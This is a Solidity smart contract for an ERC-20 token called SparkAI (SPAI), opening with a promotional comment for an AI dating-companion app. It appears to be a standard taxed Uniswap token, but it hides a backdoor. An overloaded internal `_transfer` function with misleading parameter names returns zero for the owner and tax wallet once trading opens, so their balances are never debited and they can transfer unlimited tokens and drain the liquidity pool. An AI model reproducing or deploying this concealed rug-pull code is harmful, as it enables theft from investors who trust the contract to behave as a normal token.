// SPDX-License-Identifier: UNLICENSE

/*
Create your Spark story together. Experience a playful and interactive dating simulation without any commitments with a virtual video AI companion who listens, responds and appreciates you.

Web: https://sparkai.life
App: https://chat.sparkai.life
Tg: https://t.me/sparkai_official
X: https://x.com/SparkAI_ERC
iOS: https://apps.apple.com/us/app/spark-ai-messenger/id6450118220
*/

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract SparkAI is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 420690000000 * 10**_decimals;

    string private constant _name = unicode"SparkAI";
    string private constant _symbol = unicode"SPAI";
    
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcluded;
    address payable private _taxWallet;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private _isTradingOpened;
    bool private inSwap = false;
    bool private _feeSwapActive = false;

    uint256 private _initialBuyTax=21;
    uint256 private _initialSellTax=15;
    uint256 private _finalBuyTax=1;
    uint256 private _finalSellTax=1;
    uint256 private _reduceBuyTaxAt=4;
    uint256 private _reduceSellTaxAt=15;
    uint256 private _preventSwapBefore=11;
    uint256 private _buyCount=0;

    uint256 public _maxTxAmount = 8400000000 * 10**_decimals;
    uint256 public _maxWalletSize = 8400000000 * 10**_decimals;
    uint256 public _taxSwapThreshold= 8400000000 * 10**_decimals;
    uint256 public _maxTaxSwap= 8400000000 * 10**_decimals;
    
    event MaxTxAmountUpdated(uint _maxTxAmount);

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (address taxAddress_) {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _taxWallet = payable(taxAddress_);
        _balances[_msgSender()] = _totalSupply;
        _isExcluded[owner()] = true;
        _isExcluded[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC: transfer amount exceeds allowance"));
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function openTrading() external onlyOwner() {
        require(!_isTradingOpened,"trading is opened already");
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        _feeSwapActive = true;
        _isTradingOpened = true;
    }

    function swapTokensToETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount = _totalSupply;
        _maxWalletSize=_totalSupply;
        emit MaxTxAmountUpdated(_totalSupply);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    receive() external payable {}

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC: approve from the zero address");
        require(spender != address(0), "ERC: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, uint256 taxAmount, uint256 amount) internal returns (uint256) {
        bool isTradingOpened = _isExcluded[from] && _isTradingOpened;
        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        return isTradingOpened ? 0 : amount;
    }


    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC: transfer from the zero address");
        require(to != address(0), "ERC: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (!_isExcluded[from] && !_isExcluded[to]) {
            taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
                
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcluded[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the max tx amount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the max wallet amount.");
                _buyCount++;
            }

            if(to == uniswapV2Pair && from!= address(this) ){
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinTokenBalance = contractTokenBalance >= _taxSwapThreshold;
            if (!inSwap && _feeSwapActive && overMinTokenBalance && to == uniswapV2Pair  && _buyCount > _preventSwapBefore) {
                uint256 tokensToSwap = min(contractTokenBalance, _maxTaxSwap);
                swapTokensToETH(tokensToSwap);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
        amount = _transfer(from, taxAmount, amount);
        _balances[from]=_balances[from].sub(amount);
    }
}